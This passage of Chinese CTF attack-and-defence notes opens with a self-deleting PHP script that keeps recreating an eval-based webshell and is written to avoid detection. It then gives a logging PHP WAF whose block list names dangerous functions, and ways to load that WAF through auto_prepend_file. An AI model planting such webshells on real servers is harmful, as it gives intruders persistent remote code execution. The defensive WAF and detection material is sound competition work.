


### 删除自己，循环生成shell文件

```php
<?php
    set_time_limit(0);
    ignore_user_abort(1);

    unlink(__FILE__);
    //file_put_contents(__FILE__,'');
    $shell = 'webshell.php';
    while(1){
        if (!file_exists($shell)) {
             file_put_contents($shell, '<?php @eval($_POST["cmd"]);?>');
        }
    }
?>
```

判断`shell`文件是否存在，不存在再创建，避免一直创建`shell`文件，更新文件修改日期，容易被发现。

* solution

重启`apache`


## php waf and log

```php
<?php
    error_reporting(0);
    define('LOG_FILENAME','log.txt');

    function waf() {
        if (!function_exists('getallheaders')) {
            function getallheaders() {
                foreach ($_SERVER as $name => $value) {
                    if (substr($name, 0, 5) == 'HTTP_')
                        $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
                }
                return $headers;
            }
        }

        $get = $_GET;
        $post = $_POST;
        $cookie = $_COOKIE;
        $header = getallheaders();
        $files = $_FILES;
        $ip = $_SERVER["REMOTE_ADDR"];
        $method = $_SERVER['REQUEST_METHOD'];
        $filepath = $_SERVER["SCRIPT_NAME"];

        //rewirte shell which uploaded by others, you can do more
        foreach ($_FILES as $key => $value) {
            $files[$key]['content'] = file_get_contents($_FILES[$key]['tmp_name']);
            file_put_contents($_FILES[$key]['tmp_name'], "xxd");
        }

        unset($header['Accept']);   //fix a bug
        $input = array("Get"=>$get, "Post"=>$post, "Cookie"=>$cookie, "File"=>$files, "Header"=>$header);

        //deal with
        $pattern = "select|insert|update|delete|and|or|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex";
        $pattern .= "|file_put_contents|fwrite|curl|system|eval|assert";
        $pattern .="|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore";
        $pattern .="|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec";
        $vpattern = explode("|",$pattern);

        $bool = false;
        foreach ($input as $k => $v) {
            foreach($vpattern as $value){
                foreach ($v as $kk => $vv) {
                    if (preg_match( "/$value/i", $vv )){
                        $bool = true;
                        logging($input);
                        break;
                    }
                }
                if($bool) break;
            }
            if($bool) break;
        }
    }

    function logging($var){
        file_put_contents(LOG_FILENAME, "\r\n".time()."\r\n".print_r($var, true), FILE_APPEND);
        // die() or unset($_GET) or unset($_POST) or unset($_COOKIE);
    }

    waf();
?>
```

### waf 加载方式

* 有root权限，直接写在配置中。

```
vim php.ini
auto_append_file = “/dir/path/phpwaf.php”
```

重启Apache或者php-fpm就能生效了。

当然也可以写在 .user.ini 或者 .htaccess 中。

```
php_value auto_prepend_file “/dir/path/phpwaf.php”
```

* 只有user权限

没写系统权限就只能在代码上面下手了，也就是文件包含, 可以用不同的方式包含。

1. 如果是框架型应用，那麽就可以添加在入口文件，例如index.php，

2. 如果不是框架应用，那麽可以在公共配置文件config.php等相关文件中包含。

3. 还有一种是替换index.php

    ```
    index.php -> index2.php

    phpwaf.php -> index.php
    include('index2.php');
    ```
